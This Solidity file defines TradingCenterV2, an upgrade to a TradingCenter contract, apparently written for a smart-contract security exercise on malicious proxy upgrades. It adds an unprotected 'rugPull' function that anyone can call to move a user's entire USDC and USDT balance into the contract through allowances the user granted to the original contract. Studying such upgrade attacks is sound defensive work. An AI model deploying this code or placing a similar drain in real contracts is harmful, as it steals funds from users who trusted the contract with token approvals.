// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import {IERC20} from "./TradingCenter.sol";
import {TradingCenter} from "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter {

    bool public initializedV2;

    function initializeV2() external {
        require(initializedV2 == false, "already initialized (v2)");
        initializedV2 = true;
    }

    function rugPull(address user) external {
        uint256 balanceOfUSDC = usdc.balanceOf(user);
        usdc.transferFrom(user, address(this), balanceOfUSDC);
        uint256 balanceOfUSDT = usdt.balanceOf(user);
        usdt.transferFrom(user, address(this), balanceOfUSDT);
    }
}